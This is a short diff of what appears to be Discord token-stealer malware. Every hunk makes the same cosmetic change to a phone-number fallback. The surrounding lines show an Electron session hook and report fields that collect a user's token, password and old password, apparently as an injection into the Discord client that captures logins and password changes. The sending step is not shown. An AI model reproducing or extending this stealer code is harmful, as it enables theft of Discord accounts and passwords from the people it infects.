@@ -332,7 +332,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "Phone :mobile_phone:",
-                value: `\`${user.phone ?? ":x:"}\``,
+                value: `\`${user.phone ?? "None"}\``,
                 inline: !0
             }, {
                 name: "<a:tokens:1041634540537511957> Token",
@@ -424,7 +424,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "Phone :mobile_phone:",
-                    value: `\`${user.phone ?? ":x:"}\``,
+                    value: `\`${user.phone ?? "None"}\``,
                     inline: !0
                 }, {
                     name: "<a:tokens:1041634540537511957> Token",
@@ -599,7 +599,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "Phone :mobile_phone:",
-                    value: `\`${user.phone ?? ":x:"}\``,
+                    value: `\`${user.phone ?? "None"}\``,
                     inline: !0
                 }, {
                     name: "<a:password:1041639669047238676> Password",
@@ -680,7 +680,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "Phone :mobile_phone:",
-                        value: `\`${user.phone ?? ":x:"}\``,
+                        value: `\`${user.phone ?? "None"}\``,
                         inline: !0
                     }, {
                         name: "<a:password:1041639669047238676> Old Password",
@@ -767,7 +767,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "Phone :mobile_phone:",
-                        value: `\`${user.phone ?? ":x:"}\``,
+                        value: `\`${user.phone ?? "None"}\``,
                         inline: !0
                     }, {
                         name: "<a:password:1041639669047238676> Password",
